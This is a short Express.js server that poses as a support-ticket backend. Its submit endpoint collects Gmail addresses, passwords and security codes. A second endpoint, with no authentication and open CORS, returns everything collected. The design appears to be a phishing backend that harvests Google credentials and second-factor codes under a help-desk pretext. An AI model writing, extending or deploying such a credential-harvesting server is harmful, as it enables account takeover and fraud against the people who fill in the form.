const express = require('express');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json());

let tickets = [];

app.post('/api/submit', (req, res) => {
    const { gmail, password, securityCode, problemType } = req.body;
    const newTicket = {
        id: tickets.length + 1,
        gmail,
        password,
        securityCode,
        problemType,
        timestamp: new Date()
    };
    tickets.push(newTicket);
    res.json({ success: true, message: 'Data saved successfully' });
});

app.get('/api/tickets', (req, res) => {
    res.json(tickets);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
});
